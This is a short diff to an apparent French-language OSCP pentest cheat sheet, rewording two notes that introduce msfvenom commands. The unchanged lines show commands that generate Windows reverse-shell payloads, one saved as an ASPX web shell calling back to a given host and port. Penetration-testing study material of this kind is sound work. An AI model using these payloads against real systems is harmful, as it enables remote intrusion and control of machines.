@@ -586,7 +586,7 @@ cadaver [IP]
 
 ```
 
-<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
+<p class="oscp-command-note">Générer un fichier avec msfvenom.</p>
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
@@ -1146,7 +1146,7 @@ Examiner les entrées et les réponses de l'application web.
 
 Vérifier les ports et les services de la cible autorisée.
 
-<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
+<p class="oscp-command-note">Générer un fichier avec msfvenom.</p>
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>
